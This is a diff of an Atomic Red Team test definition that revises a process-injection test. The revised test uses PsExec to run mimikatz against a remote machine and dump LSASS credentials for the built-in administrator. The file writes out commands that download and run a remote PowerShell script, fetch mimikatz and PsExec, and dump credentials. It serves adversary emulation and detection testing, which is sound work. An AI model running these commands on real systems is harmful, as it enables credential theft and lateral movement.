@@ -62,35 +62,58 @@ atomic_tests:
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
       Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
     name: powershell
-- name: Process Injection via mimikatz
+- name: Remote Process Injection in LSASS via mimikatz
   auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
   description: |
-    Use mimikatz to retrieve lsass process content via injection of a dll
+    Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
+    It must be executed in the context of a user who is privileged on remote `machine`.
+
+    The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
   supported_platforms:
   - windows
   input_arguments:
-    mimikatz_path:
-      description: mimikatz windows executable
-      type: Path
-      default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\mimikatz.exe
-    psexec_path:
-      description: psexec windows executable
-      type: Path
-      default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\PsExec.exe
-    account:
-      description: Account to impersonate
-      type: string
-      default: krbtgt
     machine:
-      description: machine to target
+      description: machine to target (via psexec)
       type: string
       default: DC1
     output_file:
       description: Output file
       type: path
-      default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\mimikatz.log
+      default: '%tmp%\mimikatz\x64\mimikatz.log'
+    mimikatz_path:
+      description: Mimikatz windows executable
+      type: path
+      default: '%tmp%\mimikatz\x64\mimikatz.exe'
+    psexec_path:
+      description: Path to PsExec
+      type: string
+      default: C:\PSTools\PsExec.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
+    prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+      Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+      New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+      Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+  - description: |
+      PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})
+    prereq_command: |
+      if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+      New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
   executor:
     command: |
-      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /name:#{account}" "exit" > #{output_file}
-    name: powershell
-    elevation_required: true
+      #{psexec_path} /accepteula \\#{machine} -s -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit" > #{output_file}
+    name: command_prompt
+    elevation_required: false # locally not, but remotely on target machine then yes
+    cleanup_command: |
+      del #{output_file}
